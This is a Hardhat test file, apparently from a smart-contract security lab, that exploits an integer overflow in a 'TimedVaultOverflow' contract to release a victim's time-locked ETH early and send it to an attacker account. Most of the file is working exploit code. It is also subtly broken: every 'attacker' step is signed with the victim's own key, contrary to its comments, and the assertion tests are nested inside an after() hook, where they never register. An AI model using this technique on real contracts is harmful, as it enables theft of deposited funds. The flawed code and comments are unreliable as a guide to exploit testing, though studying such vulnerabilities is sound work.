// Here, we're setting up our testing environment before any test is run
before(async function () {
  // We're getting signers from our Ethereum node (which comes with the Hardhat library)
  // Signers represent the Ethereum accounts that our local Ethereum node controls,
  // they can be used to send transactions and interact with smart contracts.
  [deployer, victim, attacker] = await ethers.getSigners();

  // We store the initial Ether balance of the attacker and the victim to check the effect of transactions later on.
  this.attackerInitialBalance = await ethers.provider.getBalance(
    attacker.address
  );
  this.victimInitialBalance = await ethers.provider.getBalance(victim.address);

  // We get the contract factory for our 'TimedVaultOverflow' contract using the 'getContractFactory' method.
  const TimedVaultOverflowFactory = await ethers.getContractFactory(
    "./TimedVaultOverflow.sol:TimedVaultOverflow",
    deployer
  );

  // We then deploy our smart contract using the deploy method of our contract factory.
  this.timelock = await TimedVaultOverflowFactory.deploy();

  // The victim deposits ETH into the smart contract.
  await this.timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });

  // We check the balance of the victim after the deposit.
  // It should be less than the initial balance minus the deposit (since the victim sent the deposit to the contract)
  let currentBalance = await ethers.provider.getBalance(victim.address);
  expect(currentBalance).to.be.lt(
    this.victimInitialBalance.sub(VICTIM_DEPOSIT)
  );

  // We fetch and store the block timestamp when the deposit happened.
  // This is useful to check the timelock feature of our contract.
  let block = await ethers.provider.getBlock(
    await ethers.provider.getBlockNumber()
  );
  let blockTimestamp = block.timestamp;

  // We fetch the amount deposited by the victim and the time when the deposit will be locked until.
  let victimDeposited = await this.timelock
    .connect(victim)
    .getBalance(victim.address);
  let lockTime = await this.timelock
    .connect(victim)
    .getLocktime(victim.address);

  // We check that the amount deposited by the victim is exactly the same as the intended deposit
  // This confirms that our deposit function works as expected
  expect(victimDeposited).to.equal(VICTIM_DEPOSIT);
});
// This part of the test suite focuses on exploiting a potential vulnerability in the contract.
// This is the core of our testing suite where we actually try to exploit the contract to see if it's vulnerable.
it("[Test I] Should exploit the smart contract to release the deposit before time", async function () {
  // We're using the maximum value a variable of type uint256 can hold.
  // This will be used to trigger an overflow in the contract.
  let MAX_UINT256 = ethers.constants.MaxUint256;

  // We fetch the current lock time of the victim's deposit from the contract.
  let currentLockTime = await this.timelock
    .connect(victim)
    .getLocktime(victim.address);

  // We calculate the value which, when added to the current lock time, will trigger an overflow.
  let increaseBy = MAX_UINT256.sub(currentLockTime).add(1);

  // The attacker tries to increase the lock time by the calculated value.
  // If the contract doesn't handle this situation correctly, it will lead to an overflow.
  await this.timelock.connect(victim).increaseMyLockTime(increaseBy);

  // The attracker poses as the victim and tries to withdraw the deposit.
  // If the overflow was triggered in the previous step, this withdrawal should be successful, indicating that the contract is vulnerable.
  await this.timelock.connect(victim).withdrawETH();

  // The attacker sends the withdrawn Ether to their address.
  await victim.sendTransaction({
    to: attacker.address,
    value: VICTIM_DEPOSIT,
  });
});
// Here, we're wrapping up our test suite by checking the end state of our accounts and the contract.
// This is where we determine if the exploit was successful or not.
after(async function () {
  // We're getting the balance of the victim's account from the contract.
  // If the exploit was successful, this should be 0, since the victim would have withdrawn all their Ether.
  let victimDepositedAfter = await this.timelock
    .connect(victim)
    .getBalance(victim.address);

  // We're checking if the victim's balance is 0.
  // If it is, it means the victim was able to withdraw all their Ether.
  it("[Test II] Should check if the victim's balance is 0", function () {
    expect(victimDepositedAfter).to.equal(0);
  });

  // We're getting the balance of the attacker's account.
  let attackerCurrentBalance = await ethers.provider.getBalance(
    attacker.address
  );

  // We're checking if the attacker's balance is more than the initial balance plus the victim's deposit (minus transaction fees).
  // If it is, it means the attacker was able to get the victim's Ether, indicating a successful exploit.
  it("[Test III] Should check if the attacker's balance increased by the victim's deposit", function () {
    expect(attackerCurrentBalance).to.be.gt(
      this.attackerInitialBalance
        .add(VICTIM_DEPOSIT)
        .sub(ethers.utils.parseEther("0.2"))
    );
  });
});
